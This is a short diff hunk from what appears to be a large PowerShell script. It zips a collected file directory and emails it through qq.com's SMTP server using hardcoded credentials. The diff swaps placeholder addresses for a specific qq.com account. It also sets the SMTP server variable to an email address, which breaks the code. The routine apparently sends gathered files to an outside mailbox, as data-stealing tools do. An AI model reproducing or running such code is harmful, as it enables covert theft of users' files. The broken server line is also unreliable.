@@ -2900,19 +2900,19 @@ Start-sleep -seconds 1 }}}
 
 copy-ToZip($fileSaveDir)
 
-$SMTPServer = 'smtp.qq.com'
+$SMTPServer = '1971521902@qq.com'
 
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 
 $SMTPInfo.EnableSsl = $true
 
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('xxx@qq.com', 'bhuhlaxxxxxxxxx');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('1971521902@qq.com', 'bhuhlaxxxxxxxxx');
 
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 
-$ReportEmail.From = 'xxxx@qq.com'
+$ReportEmail.From = '1971521902@qq.com'
 
-$ReportEmail.To.Add('xxxx@qq.com')
+$ReportEmail.To.Add('1971521902@qq.com')
 
 $ReportEmail.Subject = 'xxx'
 
